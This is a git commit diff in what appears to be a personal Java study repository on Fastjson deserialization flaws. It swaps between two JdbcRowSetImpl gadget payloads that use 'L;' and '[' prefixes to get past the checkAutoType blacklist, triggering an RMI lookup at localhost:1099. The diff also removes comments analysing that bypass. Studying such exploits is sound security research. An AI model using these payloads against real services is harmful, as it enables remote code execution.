2321c1f8a31424c858931b33f7112c5a5cddbf7c
Zhenkun Bian <47385982+bianzhenkun@users.noreply.github.com>
2023-05-12 14:41:09 +0800

    2023/05/12

--- src/main/java/Fastjson/Fastjson1242.java
+++ src/main/java/Fastjson/Fastjson1242.java
@@ -1,38 +1,17 @@
 package Fastjson;
 
 import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.parser.Feature;
 import com.alibaba.fastjson.parser.ParserConfig;
 
 /**
  * @author L3ttuc3
  * @version 1.0
- * @date 2023/5/11 21:10
+ * @date 2023/5/12 14:22
  */
-public class Fastjson1225 {
+public class Fastjson1242 {
     public static void main(String[] args) {
         /*
-        Fastjson1.2.25-1.2.41版本，发现会报错：autoType is not support.
-
-        FreeBuf大佬写好的流程：
-        autoTypeSupport为false:
-            从缓存中找是否有该类的Class，找不到再从Map中找到该类的ObjectDeserializer
-            然后进行黑白名单匹配
-            最后抛出JSONException异常，autoType is not support.~
-        autoTypeSupport为true：
-            进行黑白名单匹配
-            从缓存中找是否有该类的Class，找不到再从Map中找到该类的ObjectDeserializer
-            然后调用TypeUtils.loadClass(typeName, this.defaultClassLoader);加载这个类
-
-        自己分析：
-        com.alibaba.fastjson.parser.ParserConfig 加入了CheckAutoType方法，使用白名单和黑名单机制进行过滤
-        查看源码发现，首先判断if(autoTypeSupport || expectClass != null)
-        如果为真，那么就遍历白名单acceptList，看我们要转化的类是不是以白名单开头。
-        如果是就进入TypeUtils.loadClass()，加载类；如果不是，就遍历黑名单进行拦截
-        TypeUtils.loadClass()会依次看类名是不是以[和L开头。
-        1. [开头的话，会执行Class<?> componentType = loadClass(className.substring(1), classLoader);
-        随后Array.newInstance(componentType, 0).getClass();这里后续分析一下吧，根据报错感觉是应该把所有信息放在一个""里
-        2. L开头;结尾的话，就会去除首尾，随后loadClass(newClassName, classLoader)
+        Fastjson1.2.42主要是针对L;进行的修复，使用的hash值进行
          */
 
 
@@ -52,13 +31,11 @@ public class Fastjson1225 {
         JdbcRowSetImpl链子
          */
         //这是使用的L;进行绕过
-//        String payload2 = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/obj\",\"autoCommit\": true}";
+        String payload2 = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/obj\",\"autoCommit\": true}";
 
         //使用[进行绕过，与TemplatesImpl链子一样
-        String payload2 = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[,{\"dataSourceName\":\"rmi://localhost:1099/obj\",\"autoCommit\": true}";
+//        String payload2 = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[,{\"dataSourceName\":\"rmi://localhost:1099/obj\",\"autoCommit\": true}";
         ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
         JSON.parse(payload2);
-
-
     }
 }
